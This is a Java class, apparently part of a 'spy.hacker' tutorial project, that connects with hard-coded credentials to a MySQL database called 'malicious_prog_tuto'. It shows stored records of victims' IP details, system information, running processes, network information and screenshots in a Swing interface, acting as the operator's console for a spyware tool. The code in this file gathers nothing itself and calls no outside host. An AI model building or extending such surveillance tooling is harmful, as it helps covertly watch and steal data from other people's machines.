/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package spy.hacker;

import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import com.mysql.jdbc.ResultSet;
import com.mysql.jdbc.Statement;
import java.awt.Image;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Date;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.table.DefaultTableModel;

/**
 *
 * @author amine gasa
 */
public class Database {
    
  private final  String user=/*"root"*/"amine mhd";
   private final  String password=/*""*/"amine mhd 1234";
   String ipLocal="192.168.1.200";
   private String url="jdbc:mysql://" + ipLocal + ":3306/malicious_prog_tuto";
   private Connection cnx;
  private Statement st;
  private PreparedStatement st1;
  private ResultSet rst;
   public void ConnexionIntoDatabase(){
      try {
          Class.forName("com.mysql.jdbc.Driver");

          try {
              cnx=(Connection)DriverManager.getConnection(url,user,password);
           //   System.out.println("Successful connexion");
          } catch (SQLException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
          
          
      } catch (ClassNotFoundException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }
  

void get_info(JTable t){
      try {
          st=(Statement) cnx.createStatement();
          String sql="select id , ip_info, date from  data";
          rst=(ResultSet)st.executeQuery(sql);
          DefaultTableModel mo=(DefaultTableModel) t.getModel();
          Object row[] =new Object[3];
          while(rst.next()){
              row[0]=rst.getInt("id");
              row[1]=rst.getString("ip_info");
              row[2]=rst.getString("date");
              mo.addRow(row);
          }
          
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
  

}
  void getMoreData(JTextArea jt,int id){
    String sql="select * from data where id =?";
      try {
          st1=(PreparedStatement)cnx.prepareStatement(sql);
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
      try {
          st1.setInt(1, id);
          rst=(ResultSet)st1.executeQuery();
          String s="";
          if(rst.next()){
              s=" ID : "+rst.getInt("id")+ " date : "+ rst.getString("date")+ "\n\t\t====="+rst.getString("ip_info")+" ======"+
                       "\n\t\t ===== System info ====\n"+rst.getString("sys_info")+
                       "\n\t\t"+rst.getString("list_process")+"\n\t\t\n"
               +rst.getString("network_info")+"";
          }
          jt.setText(s);
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
    
}
   public void Screenshot(JLabel label, int id){
       String sql="select image from  data where id= ?";
      try {
          st1=(PreparedStatement)cnx.prepareStatement(sql);
          st1.setInt(1, id);
          rst=(ResultSet)st1.executeQuery();
          if(rst.next()){
            label.setIcon((resizeImage(rst.getBytes("image"),label)));
          }
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }

    private Icon resizeImage(byte[] bytes,JLabel label) {
        ImageIcon imgIcon=new ImageIcon(bytes);
        Image img=imgIcon.getImage();
        Image new_img=img.getScaledInstance(label.getWidth(), label.getHeight(),Image.SCALE_SMOOTH);
        ImageIcon image= new ImageIcon(new_img);
        return image;
    }
}
